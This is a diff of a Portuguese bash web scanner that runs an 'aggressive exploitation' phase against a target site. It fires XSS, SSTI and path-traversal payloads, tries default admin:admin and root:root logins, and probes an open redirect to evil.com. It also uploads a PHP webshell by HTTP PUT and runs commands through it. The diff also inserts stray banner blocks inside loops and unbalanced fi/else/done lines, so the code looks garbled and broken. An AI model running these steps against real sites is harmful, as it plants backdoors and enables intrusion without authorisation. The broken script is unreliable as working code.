 # ===== PASSO 18: SEARCHSPLOIT =====
-progresso "SearchSploit - Buscando exploits"
-if command -v searchsploit &>/dev/null; then
-  SERVER=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
-  [ -n "$SERVER" ] && searchsploit "$SERVER" 2>/dev/null | grep -i "vulnerability\|exploit" | head -10
+progresso "SearchSploit - Buscando exploits" 2
+if valida_ferramenta "searchsploit"; then
+  SERVER=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
+  [ -n "$SERVER" ] && searchsploit "$SERVER" 2>/dev/null | grep -i "vulnerability\|exploit" | head -10 || aviso "searchsploit falhou"
 fi
 
 # ===== PASSO 19: METODOS HTTP =====
-progresso "Verificando metodos HTTP"
-curl -s -X OPTIONS -I -L "$ALVO" 2>/dev/null | grep -i "allow:" | head -5
-PUT_CODE=$(curl -s -L -X PUT -d "test" "$ALVO/test.txt" -o /dev/null -w "%{http_code}" 2>/dev/null)
+if [ "$WEB_ATIVO" = "1" ]; then
+progresso "Verificando metodos HTTP" 2
+curl_rapido -X OPTIONS -I -L "$ALVO" 2>/dev/null | grep -i "allow:" | head -5
+PUT_CODE=$(curl_rapido -L -X PUT -d "test" "$ALVO/test.txt" -o /dev/null -w "%{http_code}" 2>/dev/null)
 echo "$PUT_CODE" | grep -qE "200|201|204" && critico "Metodo PUT habilitado! (HTTP $PUT_CODE)"
 
 # ===== PASSO 20: SERVICOS COMUNS =====
-progresso "Procurando servicos comuns"
+progresso "Procurando servicos comuns" 2
 for srv in cgi-bin/ cgi-bin/test.cgi server-status server-info phpMyAdmin phpmyadmin phppgadmin adminer.php mysql phpinfo.php info.php; do
-  body_code=$(curl -s -L --max-time 3 -o /tmp/.deeprecon_srv -w "%{http_code}" "$ALVO/$srv" 2>/dev/null)
+  body_code=$(curl_rapido -L --max-time 3 -o /tmp/.deeprecon_srv -w "%{http_code}" "$ALVO/$srv" 2>/dev/null)
   if [ "$body_code" = "200" ]; then
     body=$(cat /tmp/.deeprecon_srv 2>/dev/null)
     case "$srv" in
@@ -525,91 +1097,127 @@ for srv in cgi-bin/ cgi-bin/test.cgi server-status server-info phpMyAdmin phpmya
       cgi-bin/test.cgi) echo "$body" | grep -qi "cgi\|content-type" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
     esac
   fi
+# ============================================================
+
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+
 done
 rm -f /tmp/.deeprecon_srv 2>/dev/null
 
 # ===== PASSO 21: CVE CHECK =====
-progresso "Verificando versoes antigas"
-SERVER=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
+progresso "Verificando versoes antigas" 2
+SERVER=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
 echo "$SERVER" | grep -qi "apache/2\.[0123]\|apache/1\." && critico "Apache versao antiga!"
 echo "$SERVER" | grep -qi "nginx/1\.[0-9]" && critico "Nginx versao antiga!"
 echo "$SERVER" | grep -qi "php/5\.[0-6]" && critico "PHP versao antiga!"
 echo "$SERVER" | grep -qi "iis/6\|iis/7" && critico "IIS versao antiga!"
 
 # ===== PASSO 22: EXPLORACAO AGRESSIVA =====
-progresso "Exploracao agressiva - testando invasao"
+progresso "Exploracao agressiva - testando invasao" 2
 info "Testando XSS refleto..."
 XSS_PAYLOADS=("<script>alert(1)</script>" "\"><script>alert(1)</script>" "'><script>alert(1)</script>")
-for param in $(curl -s "$ALVO" 2>/dev/null | tr "'" '"' | grep -oP 'name="?\K[a-z_][a-zA-Z0-9_]*' | sort -u | head -5); do
+for param in $(curl_rapido "$ALVO" 2>/dev/null | tr "'" '"' | grep -oP 'name="?\K[a-z_][a-zA-Z0-9_]*' | sort -u | head -5); do
   for payload in "${XSS_PAYLOADS[@]}"; do
-    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "${ALVO}?${param}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
+    code=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 3 "${ALVO}?${param}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
     [ "$code" = "200" ] && aviso "Possivel XSS: $ALVO?$param=$payload"
   done
+# ============================================================
+
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+
 done
 
 info "Testando path traversal..."
 for path in "../../../etc/passwd" "../../etc/passwd" "../etc/passwd" "..\\..\\..\\windows\\win.ini"; do
-  body=$(curl -s --max-time 3 "$ALVO/$path" 2>/dev/null)
+  body=$(curl_rapido --max-time 3 "$ALVO/$path" 2>/dev/null)
   echo "$body" | grep -qi "root:\|\[extensions\]" && critico "PATH TRAVERSAL: $ALVO/$path expoe arquivos do sistema!"
+# ============================================================
+
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+
 done
 
 info "Testando exposicao de .git..."
-GIT_URL=$(curl -s --max-time 3 "$ALVO/.git/config" 2>/dev/null)
+GIT_URL=$(curl_rapido --max-time 3 "$ALVO/.git/config" 2>/dev/null)
 echo "$GIT_URL" | grep -qi "\[core\]" && critico "REPOSITORIO GIT EXPOSTO: $ALVO/.git/config baixavel!"
 
 info "Testando exposicao de .env..."
-ENV_CONTENT=$(curl -s --max-time 3 "$ALVO/.env" 2>/dev/null)
+ENV_CONTENT=$(curl_rapido --max-time 3 "$ALVO/.env" 2>/dev/null)
 echo "$ENV_CONTENT" | grep -qi "DB_\|APP_\|SECRET\|PASSWORD\|KEY" && critico "ARQUIVO .ENV EXPOSTO com credenciais!"
 
 info "Testando CORS misconfiguration..."
-CORS_HEADER=$(curl -s -I -H "Origin: https://malicious.com" --max-time 3 "$ALVO" 2>/dev/null | grep -i "^access-control-allow-origin:")
+CORS_HEADER=$(curl_rapido -I -H "Origin: https://malicious.com" --max-time 3 "$ALVO" 2>/dev/null | grep -i "^access-control-allow-origin:")
 echo "$CORS_HEADER" | grep -qi "malicious" && critico "CORS MISCONFIG: Access-Control-Allow-Origin reflete qualquer origem!"
 
 info "Testando default credentials..."
 for path in admin login wp-admin painel dashboard administrador; do
-  SEM_AUTH=$(curl -s -L --max-time 3 -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
-  COM_AUTH_ADMIN=$(curl -s -L --max-time 3 -u "admin:admin" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
-  COM_AUTH_ROOT=$(curl -s -L --max-time 3 -u "root:root" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
+  SEM_AUTH=$(curl_rapido -L --max-time 3 -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
+  COM_AUTH_ADMIN=$(curl_rapido -L --max-time 3 -u "admin:admin" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
+  COM_AUTH_ROOT=$(curl_rapido -L --max-time 3 -u "root:root" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
   if [ "$SEM_AUTH" != "$COM_AUTH_ADMIN" ] && [ "$COM_AUTH_ADMIN" = "200" ]; then
     critico "DEFAULT CREDENTIALS: admin:admin funciona em $ALVO/$path!"
   fi
   if [ "$SEM_AUTH" != "$COM_AUTH_ROOT" ] && [ "$COM_AUTH_ROOT" = "200" ]; then
     critico "DEFAULT CREDENTIALS: root:root funciona em $ALVO/$path!"
   fi
+# ============================================================
+
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+
 done
 
 info "Testando open redirect..."
-REDIR_TEST=$(curl -s -L -o /dev/null -w "%{url_effective}" --max-time 3 "${ALVO}?redirect=http://evil.com&url=http://evil.com&next=http://evil.com&return=http://evil.com" 2>/dev/null)
+REDIR_TEST=$(curl_rapido -L -o /dev/null -w "%{url_effective}" --max-time 3 "${ALVO}?redirect=http://evil.com&url=http://evil.com&next=http://evil.com&return=http://evil.com" 2>/dev/null)
 echo "$REDIR_TEST" | grep -qvi "$DOMINIO" && [ -n "$REDIR_TEST" ] && critico "OPEN REDIRECT: redireciona para dominio externo ($REDIR_TEST)"
 
 info "Testando SSTI (Server-Side Template Injection)..."
 SSTI_PAYLOADS=("{{7*7}}" "\${7*7}" "<%= 7*7 %>" "#{7*7}" "*{7*7}")
 for payload in "${SSTI_PAYLOADS[@]}"; do
-  SSTI_RESULT=$(curl -s --max-time 3 "${ALVO}?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
+  SSTI_RESULT=$(curl_rapido --max-time 3 "${ALVO}?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
   echo "$SSTI_RESULT" | grep -q "49" && aviso "Possivel SSTI: $ALVO?name=$payload (retornou 49)"
+# ============================================================
+
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+
 done
 
 info "Testando upload de webshell via PUT..."
-PUT_TEST=$(curl -s -L -X PUT -d "<?php system(\$_GET['cmd']); ?>" "$ALVO/shell.php" -o /dev/null -w "%{http_code}" 2>/dev/null)
+PUT_TEST=$(curl_rapido -L -X PUT -d "<?php system(\$_GET['cmd']); ?>" "$ALVO/shell.php" -o /dev/null -w "%{http_code}" 2>/dev/null)
 if [ "$PUT_TEST" = "200" ] || [ "$PUT_TEST" = "201" ] || [ "$PUT_TEST" = "204" ]; then
   critico "WEBSHELL UPLOAD: PUT $ALVO/shell.php funcionou! ($PUT_TEST)"
-  CHECK_SHELL=$(curl -s -L --max-time 3 "$ALVO/shell.php?cmd=id" 2>/dev/null)
+  CHECK_SHELL=$(curl_rapido -L --max-time 3 "$ALVO/shell.php?cmd=id" 2>/dev/null)
   echo "$CHECK_SHELL" | grep -qi "uid=" && critico "WEBSHELL ACESSAVEL: $ALVO/shell.php?cmd=id"
 fi
 
 info "Verificando phpinfo exposto..."
-PHPINFO=$(curl -s --max-time 3 "$ALVO/phpinfo.php" 2>/dev/null)
+PHPINFO=$(curl_rapido --max-time 3 "$ALVO/phpinfo.php" 2>/dev/null)
 echo "$PHPINFO" | grep -qi "PHP Version\|phpinfo()" && critico "PHPINFO EXPOSTO: $ALVO/phpinfo.php vaza configuracoes do PHP!"
 
 info "Verificando backup files expostos..."
 for bak in .bak .old .swp ~ .save backup.sql dump.sql db.sql config.php.bak; do
-  BAK_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/config.php$bak" 2>/dev/null)
+  BAK_CODE=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/config.php$bak" 2>/dev/null)
   [ "$BAK_CODE" = "200" ] && critico "BACKUP EXPOSTO: $ALVO/config.php$bak"
+# ============================================================
+
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+
 done
 
 # ===== PASSO 23: METASPLOIT - SCANNERS AUXILIARES =====
-progresso "Metasploit - Rodando scanners auxiliares"
-if command -v msfconsole &>/dev/null; then
+progresso "Metasploit - Rodando scanners auxiliares" 2
+if valida_ferramenta "msfconsole"; then
   MSF_RC=$(mktemp)
   DOMINIO_ESC=$(echo "$DOMINIO" | sed 's/\./\\./g')
   cat > "$MSF_RC" << EOM
@@ -656,7 +1264,7 @@ run
 
 exit
 EOM
-  MSF_OUT=$(timeout 90 msfconsole -q -r "$MSF_RC" 2>/dev/null)
+  MSF_OUT=$(timeout 90 msfconsole -q -r "$MSF_RC" 2>/dev/null) || aviso "msfconsole timeout ou falhou"
   rm -f "$MSF_RC"
   echo "$MSF_OUT" | grep -E '\[+\]|\[!\]|\[-\]' | grep -vi 'No response' | while IFS= read -r line; do
     clean=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g' | xargs)
@@ -664,9 +1272,12 @@ EOM
     echo "$clean" | grep -qiE '\[+\]|detected|allowed|missing|directory|backup|info' && aviso "METASPLOIT: $clean"
   done
 fi
+else
+  aviso "Pulando testes HTTP e exploracao (sem porta web)"
+fi
 
 # ===== PASSO 24: IA BRAIN - MOTOR COGNITIVO =====
-progresso "IA Brain - Pensando... (motor cognitivo ativado)"
+progresso "IA Brain - Pensando... (motor cognitivo ativado)" 2
 REPORT_TEXT=$(cat "$REPORT" 2>/dev/null)
 TOTAL_CRIT=$(echo "$REPORT_TEXT" | grep -c "\[CRITICO\]")
 TOTAL_ALERT=$(echo "$REPORT_TEXT" | grep -c "\[ALERTA\]")
@@ -748,6 +1359,12 @@ TOTAL_PONTOS=0
 for key in "${!SCORES[@]}"; do
   count=$(echo "$REPORT_TEXT" | grep -c "$key")
   [ "$count" -gt 0 ] && TOTAL_PONTOS=$((TOTAL_PONTOS + (SCORES[$key] * count)))
+# ============================================================
+
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+
 done
 TOTAL_PONTOS=$((TOTAL_PONTOS + CORRELATION_WEIGHT))
 RAW_SCORE=$((TOTAL_PONTOS * 100 / (TOTAL_ACHADOS * 100 + CORRELATION_WEIGHT)))
@@ -957,22 +1574,177 @@ echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Emitir relatorio...${RESET}  ${CYA
 echo ""
 
 # ============================================================
+# ===== PASSO 25: INFORMACOES DNS ADICIONAIS =====
+progresso "Coletando informacoes DNS adicionais" 1
+{
+  echo ""
+  echo "=== INFORMACOES DNS ==="
+  echo "Dominio: $DOMINIO"
+  for tipo in MX NS TXT SOA; do
+    result=$(dig +short "$DOMINIO" "$tipo" 2>/dev/null | head -5)
+    [ -n "$result" ] && echo "  Registros $tipo: $(echo "$result" | tr '\n' ' ')"
+  done
+  echo "================================"
+} >> "$REPORT" 2>/dev/null || aviso "dig falhou para $DOMINIO"
+
+# ===== PASSO 26: VERIFICACAO DE EMAIL/SPF/DMARC =====
+progresso "Verificando seguranca de e-mail (SPF/DKIM/DMARC)" 1
+{
+  echo ""
+  echo "=== SEGURANCA DE EMAIL ==="
+  SPF=$(dig +short "$DOMINIO" TXT 2>/dev/null | grep -i "v=spf1" | head -1)
+  [ -n "$SPF" ] && echo "  SPF: Presente" || echo "  SPF: AUSENTE (risco de spoofing)"
+  DMARC=$(dig +short "_dmarc.$DOMINIO" TXT 2>/dev/null | grep -i "v=dmarc" | head -1)
+  [ -n "$DMARC" ] && echo "  DMARC: Presente" || echo "  DMARC: AUSENTE"
+  MX=$(dig +short "$DOMINIO" MX 2>/dev/null | head -5)
+  [ -n "$MX" ] && echo "  Servidores MX:" && echo "$MX" | while read -r pref host; do echo "    $host (prioridade $pref)"; done
+  echo "================================"
+} >> "$REPORT" 2>/dev/null || aviso "verificacao de email falhou"
+
+# ===== PASSO 27: HEADERS DE SEGURANCA HTTP =====
+progresso "Analisando headers de seguranca HTTP" 1
+{
+  echo ""
+  echo "=== HEADERS DE SEGURANCA ==="
+  for h in "Strict-Transport-Security" "X-Frame-Options" "X-Content-Type-Options" \
+           "Content-Security-Policy" "X-XSS-Protection" "Referrer-Policy" \
+           "Permissions-Policy" "Access-Control-Allow-Origin"; do
+    val=$(curl_rapido -sI "$ALVO" 2>/dev/null | grep -i "^$h:" | sed "s/$h: //I")
+    [ -n "$val" ] && echo "  $h: $val" || echo "  $h: AUSENTE"
+  done
+  echo "================================"
+} >> "$REPORT" 2>/dev/null || aviso "analise de headers falhou"
+
+# ===== PASSO 28: TESTE SSL CIPHERS =====
+progresso "Testando SSL/TLS ciphers" 2
+if [ "$PROTOCOLO" = "https" ]; then
+  {
+    echo ""
+    echo "=== TESTE SSL CIPHERS ==="
+    WEAK_CIPHERS=$(nmap --script ssl-enum-ciphers -p 443 "$DOMINIO" 2>/dev/null | grep -i "weak\|TLSv1.0\|TLSv1.1\|RC4\|DES\|3DES\|EXPORT\|NULL\|LOW" | head -5)
+    if [ -n "$WEAK_CIPHERS" ]; then
+      echo "  Ciphers FRACOS detectados:"
+      echo "$WEAK_CIPHERS" | while read -r line; do echo "    $line"; done
+      critico "SSL ciphers fracos detectados"
+    else
+      echo "  Ciphers OK - nenhum fraco detectado"
+    fi
+    echo "================================"
+  } >> "$REPORT" 2>/dev/null || aviso "teste SSL ciphers falhou"
+fi
+
+# ===== PASSO 29: ANALISE DE WAF =====
+progresso "Analisando comportamento do WAF" 2
+WAF_HEADERS=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -iE "cf-ray|__cfduid|cf-cache-status|x-sucuri|x-waf|server.*cloudflare|server.*akamai|server.*incapsula|x-powered-by.*waf" | head -3)
+if [ -n "$WAF_HEADERS" ]; then
+  aviso "WAF detectado via headers"
+  {
+    echo ""
+    echo "=== WAF DETECTADO ==="
+    echo "$WAF_HEADERS"
+    echo "================================"
+  } >> "$REPORT"
+fi
+
+# ===== PASSO 30: BUSCA CVE POR TECNOLOGIA =====
+progresso "Buscando CVEs para tecnologias detectadas" 2
+{
+  echo ""
+  echo "=== CVES POR TECNOLOGIA ==="
+  if [ "$TEC_WP" = "1" ]; then
+    WP_VER=$(curl_rapido -s "$ALVO/readme.html" 2>/dev/null | grep -oP "Version \K[0-9.]+" | head -1)
+    [ -z "$WP_VER" ] && WP_VER=$(curl_rapido -s "$ALVO" 2>/dev/null | grep -oP "ver=\K[0-9.]+" | head -1)
+    echo "  WordPress: ${WP_VER:-desconhecida}"
+    [ -n "$WP_VER" ] && echo "    searchsploit wordpress $WP_VER"
+  fi
+  for tec in php apache nginx iis; do
+    var="TEC_$(echo $tec | tr '[:lower:]' '[:upper:]')"
+    [ "${!var}" = "1" ] && echo "  $tec detectado - searchsploit $tec para CVEs"
+  done
+  echo "================================"
+} >> "$REPORT" 2>/dev/null || aviso "busca CVE falhou"
+
+# ===== PASSO 31: EXPORT JSON =====
+progresso "Exportando resultados em JSON" 1
+JSON_FILE="${REPORT%.txt}.json"
+{
+  echo "{"
+  echo "  \"alvo\": \"$ALVO\","
+  echo "  \"dominio\": \"$DOMINIO\","
+  echo "  \"data\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\","
+  echo "  \"criticos\": $TOTAL_CRITICOS,"
+  echo "  \"alertas\": $TOTAL_ALERTAS,"
+  echo "  \"nivel\": \"$NIVEL\""
+  echo "}"
+} > "$JSON_FILE" 2>/dev/null && info "JSON exportado: $JSON_FILE"
+
+# ===== PASSO 32: RELATORIO HTML =====
+progresso "Gerando relatorio HTML" 1
+gerar_html_report
+
+# ===== PASSO 33: PORTAS ADICIONAIS (TOP 1000) =====
+progresso "Escaneando portas adicionais (top 1000)" 3
+{
+  echo ""
+  echo "=== PORTAS ADICIONAIS ==="
+  NMAP_EXTRA=$(nmap -T5 -Pn --top-ports 1000 --open "$DOMINIO" 2>/dev/null | grep "^[0-9]/tcp" | head -20)
+  if [ -n "$NMAP_EXTRA" ]; then
+    echo "$NMAP_EXTRA" | while read -r line; do
+      port=$(echo "$line" | cut -d/ -f1)
+      service=$(echo "$line" | awk '{print $3}')
+      echo "  $port/$service aberta"
+    done
+  else
+    echo "  Nenhuma porta adicional alem das ja escaneadas"
+  fi
+  echo "================================"
+} >> "$REPORT" 2>/dev/null || aviso "scan de portas extra falhou"
+
+# ===== PASSO 34: SERVICOS SMB/FTP =====
+progresso "Verificando servicos SMB/FTP" 2
+{
+  echo ""
+  echo "=== SERVICOS SMB/FTP ==="
+  for p in 21 445 139 22 23; do
+    timeout 3 bash -c "echo >/dev/tcp/$DOMINIO/$p" 2>/dev/null && echo "  Porta $p aberta" || true
+  done
+  echo "================================"
+} >> "$REPORT" 2>/dev/null || true
+
+# ===== PASSO 35: CORRELACAO FINAL =====
+progresso "Correlacao final e sumarizacao" 1
+{
+  echo ""
+  echo "=== CORRELACAO FINAL ==="
+  echo "Total de criticos: $TOTAL_CRITICOS"
+  echo "Total de alertas: $TOTAL_ALERTAS"
+  echo "Nivel de risco: $NIVEL"
+  echo "Tecnologias: ${TEC_NOME:-Nenhuma detectada}"
+  echo "Ruido acumulado: $NOISE_ACUM"
+  echo "================================"
+} >> "$REPORT" 2>/dev/null
+
+# ===== SEPARADOR =====
+echo ""
+echo -e "${MAGENTA}${BOLD}════════════════════════════════════════════════════${RESET}"
+echo ""
+
 # PASSO 25: INFORMACOES DO SITE
 # ============================================================
 echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
 echo -e "${GREEN}${BOLD}║           INFORMACOES DO SITE                   ║${RESET}"
 echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
 
-SERVER_HEADER=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
+SERVER_HEADER=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
 echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Servidor:${RESET}       ${CYAN}${SERVER_HEADER:-Nao identificado}${RESET}"
 
 if echo "$SERVER_HEADER" | grep -qi "cloudflare\|cloudflare-nginx"; then
   echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}CDN:${RESET}            ${YELLOW}Cloudflare detectado!${RESET}"
-elif curl -sI "$ALVO" 2>/dev/null | grep -qi "cf-ray\|__cfduid\|cf-cache-status"; then
+elif curl_rapido -I "$ALVO" 2>/dev/null | grep -qi "cf-ray\|__cfduid\|cf-cache-status"; then
   echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}CDN:${RESET}            ${YELLOW}Cloudflare detectado!${RESET}"
 fi
 
-POWERED_BY=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^x-powered-by:" | sed 's/.*: //')
+POWERED_BY=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^x-powered-by:" | sed 's/.*: //')
 [ -n "$POWERED_BY" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Powered by:${RESET}    ${CYAN}$POWERED_BY${RESET}"
 
 echo -e "${GREEN}${BOLD}║${RESET}"
@@ -1034,7 +1806,7 @@ PAIS=$(whois "$IP" 2>/dev/null | grep -iE "country|pais" | head -1 | sed 's/.*: 
 echo -e "${GREEN}${BOLD}║${RESET}"
 echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}-- Tecnologias Detectadas --${RESET}"
 echo -e "${GREEN}${BOLD}║${RESET}  ${CYAN}Veja o WhatWeb acima para tecnologias completas${RESET}"
-X_POWERED=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^x-powered-by:" | sed 's/.*: //')
+X_POWERED=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^x-powered-by:" | sed 's/.*: //')
 [ -n "$X_POWERED" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}X-Powered-By:${RESET}  ${CYAN}$X_POWERED${RESET}"
 
 echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
@@ -1090,6 +1862,12 @@ echo "$REPORT_TEXT" | while IFS= read -r line; do
       echo "  Comando: $(echo "$fix" | grep -oP 'sudo[^.\n]*|a2dismod[^.\n]*|rm -f[^.\n]*|systemctl[^.\n]*|htpasswd[^.\n]*|RedirectMatch[^.\n]*|add_header[^.\n]*|location[^.\n]*|LimitExcept[^.\n]*' | head -1)"
     } >> "$REPORT"
   fi
+# ============================================================
+
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+
 done
 
 echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
@@ -1148,5 +1926,38 @@ echo ""
   echo "NIVEL: $NIVEL"
   echo "============================================"
 } >> "$REPORT"
+
+# === LIMPEZA ===
+limpar_temporarios
+
+# ============================================================
+# CONCLUSAO
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+echo -e "${GREEN}${BOLD}║           VARREDURA CONCLUIDA!                  ║${RESET}"
+echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
+echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Alvo:${RESET}          ${CYAN}$ALVO${RESET}"
+echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Passos:${RESET}        ${CYAN}$PASSO_ATUAL de $TOTAL_PASSOS${RESET}"
+echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Criticos:${RESET}      ${RED}$TOTAL_CRITICOS${RESET}"
+echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Alertas:${RESET}       ${YELLOW}$TOTAL_ALERTAS${RESET}"
+echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Nivel:${RESET}         ${COR}$NIVEL${RESET}"
+np_final=$((NOISE_ACUM*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
+cn_final=$([ "$np_final" -le 30 ]&&echo "$GREEN"||[ "$np_final" -le 60 ]&&echo "$YELLOW"||echo "$RED")
+nf=$((np_final/2)); ne=$((50-nf))
+bf=$(printf "%${nf}s"|tr ' ' '#'); be=$(printf "%${ne}s")
+echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Ruido:${RESET}         ${cn_final}[${bf}${be}] ${np_final}%${RESET}"
+echo -e "${GREEN}${BOLD}║${RESET}"
+echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Relatorio:${RESET}     ${CYAN}$REPORT${RESET}"
+echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}JSON:${RESET}          ${CYAN}${REPORT%.txt}.json${RESET}"
+echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}HTML:${RESET}          ${CYAN}${REPORT%.txt}.html${RESET}"
+echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
+echo ""
+
+# Trunca relatorio se exceder limite (seguranca contra estouro de disco)
+[ -f "$REPORT" ] && [ "$(stat -c%s "$REPORT" 2>/dev/null || echo 0)" -gt "$MAX_OUTPUT_BYTES" ] && {
+  head -c "$MAX_OUTPUT_BYTES" "$REPORT" > "${REPORT}.trim" 2>/dev/null && mv "${REPORT}.trim" "$REPORT" 2>/dev/null
+  aviso "Relatorio truncado para ${MAX_OUTPUT_BYTES} bytes (use JSON/HTML para dados completos)"
+}
 
 done
